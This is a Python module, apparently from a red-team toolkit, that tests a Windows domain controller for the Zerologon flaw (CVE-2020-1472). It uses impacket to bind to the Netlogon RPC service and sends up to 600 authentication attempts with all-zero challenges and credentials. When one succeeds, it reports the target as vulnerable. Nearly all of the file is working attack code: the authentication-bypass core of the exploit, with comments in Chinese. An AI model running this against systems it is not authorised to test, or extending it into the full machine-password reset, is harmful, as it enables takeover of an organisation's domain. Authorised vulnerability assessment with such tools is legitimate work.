import argparse
import logging
import sys

from certipy.lib.target import Target
from impacket import ntlm
from impacket.dcerpc.v5 import nrpc, epm
from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_LEVEL_PKT_PRIVACY
from impacket.dcerpc.v5.transport import DCERPCTransportFactory

from lib import Runner
from lib.utils import ntlm_info

str_binding_map = {
    'smb': f'ncacn_np:%s[\\PIPE\\netlogon]',
    'tcp': '',
}

rpc_method_map = {
    # 1: nrpc.hNetrServerAuthenticate,
    # mimikatz用这个
    2: nrpc.hNetrServerAuthenticate2,
    # cve-2020-1472-exploit.py、set_empty_pw.py、zerologon.py都用这个
    3: nrpc.hNetrServerAuthenticate3,
}

default_params = {
    'target_name': None,
    # 默认走tcp，应该鞥提高一点效率，如果rpc端口不通的话可以试试smb
    'rpc_transport': 'tcp',
    # 默认rpc方法为 hNetrServerAuthenticate3
    'auth_method': 3,
    # 根据大佬们研究，尝试次数为200次时，漏报概率为0.04%，这里默认设置为600次，对域控应该不会有影响吧。
    'max_attempts': 600
}


def add_add_argument_group(parser: argparse.ArgumentParser):
    group = parser.add_argument_group('zerologon options')
    group.add_argument('-target-name', help='目标域控机器名')
    group.add_argument('-rpc_transport', choices=str_binding_map.keys(), help='rpc transport for zerologon test')
    group.add_argument('-auth-method', choices=rpc_method_map.keys(), help='rpc method', type=int)
    group.add_argument('-max-attempts', help='zerologon测试最大尝试次数', type=int)


def zerologon(target_ip, target_name, rpc_transport, auth_method, max_attempts):
    # 默认会自动获取机器名，当然也可以指定机器名
    # 默认使用rpc over tcp, rpc函数使用NetrServerAuthenticate3
    if target_name is None:
        target_info = ntlm_info(target_ip)
        target_name = target_info[ntlm.NTLMSSP_AV_HOSTNAME]

    # 防止输错机器名
    target_name = target_name.rstrip('$')
    if rpc_transport == 'tcp':
        str_binding = epm.hept_map(target_ip, nrpc.MSRPC_UUID_NRPC, protocol='ncacn_ip_tcp')
    else:
        str_binding = str_binding_map[rpc_transport] % target_ip
    logging.debug({'target name': target_name, 'rpc binding': str_binding})
    dce = DCERPCTransportFactory(str_binding).get_dce_rpc()
    # rpc流量加密
    dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
    dce.connect()
    dce.bind(nrpc.MSRPC_UUID_NRPC)

    # Use an all-zero challenge and credential.
    plaintext = b'\x00' * 8
    ciphertext = b'\x00' * 8

    # Standard flags observed from a Windows 10 client (including AES), with only the sign/seal flag disabled.
    flags = 0x212fffff

    primary_name = f'\\\\{target_name}\x00'
    # 这个参数随便填
    computer_name = f'BTEAM-PC\x00'
    # 这个参数必须是域控的samAccountName，名称和ip可以不对应
    account_name = f'{target_name}$\x00'
    logging.info(f'checking target {target_ip}...')
    is_vulnerable = False
    for _ in range(max_attempts):
        params = {
            'dce': dce,
            'primaryName': primary_name,
            'computerName': computer_name,
            'clientChallenge': plaintext
        }
        nrpc.hNetrServerReqChallenge(**params)

        params = {
            'dce': dce,
            'primaryName': primary_name,
            'accountName': account_name,
            'secureChannelType': nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel,
            'computerName': computer_name,
            'clientCredential': ciphertext,
            'negotiateFlags': flags
        }
        try:
            server_auth = rpc_method_map[auth_method](**params)

            # It worked!
            assert server_auth['ErrorCode'] == 0
            is_vulnerable = True
            break

        except nrpc.DCERPCSessionError as ex:
            # Failure should be due to a STATUS_ACCESS_DENIED error. Otherwise, the attack is probably not working.
            if ex.get_error_code() == 0xc0000022:
                continue
            else:
                logging.debug(f'Unexpected error code from DC: {ex}.')
        except BaseException as ex:
            print(f'Unexpected error: {ex}.')
    if is_vulnerable:
        logging.info(f'[{target_ip}] is vulnerable to zero logon!!!')
    else:
        logging.info(f'[{target_ip}] might not vulnerable:<')


class CVE20201472(Runner):
    def __init__(self, target: Target, opts):
        super().__init__(target, required_params=['dc_ip'])
        self._target = target
        self._opts = opts

    def run(self, target_ip=None):
        if target_ip is None:
            target_ip = self._target.dc_ip
        user_pots = {}
        [
            user_pots.update(
                {it: getattr(self._opts, it)}
            )
            for it in default_params.keys()
            if getattr(self._opts, it)
        ]
        default_params.update(user_pots)
        zerologon(target_ip, **default_params)
